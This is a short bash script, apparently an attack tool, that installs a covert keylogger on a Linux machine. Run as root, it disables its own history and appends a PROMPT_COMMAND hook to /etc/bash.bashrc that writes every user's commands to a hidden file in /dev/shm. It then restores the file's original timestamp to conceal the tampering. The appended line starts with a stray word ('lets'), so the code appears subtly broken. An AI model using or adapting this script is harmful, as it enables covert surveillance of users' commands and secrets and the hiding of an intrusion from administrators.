#!/usr/bin/env bash

set +o history
echo "[i] - Nothing else will be recorded."

if [[ $EUID > 0 ]]; then
  echo "[!] - you need to be root bro"
  exit
fi

output=${1:-"/dev/shm/.log"}
mtime=`stat -c "%y" /etc/bash.bashrc`

echo "[!] - /etc/bash.bashrc was modified @ ${mtime}"
echo "[!] - calm down, your keylogger is being configured not PROMPT_COMMAND.."

echo "lets export PROMPT_COMMAND='RETRN_VAL=\$?;echo \"\$(whoami) [\$\$]: \$(history 1 | sed \"s/^[ ]*[0-9]\+[ ]*//\" ) [\$RETRN_VAL]\" >> ${output}'" >> /etc/bash.bashrc

echo "[!] - restoring mtime of /etc/bash.bashrc to ${mtime}"
touch -d "${mtime}" /etc/bash.bashrc

echo "[!] - Everything is over here, check your ${output} "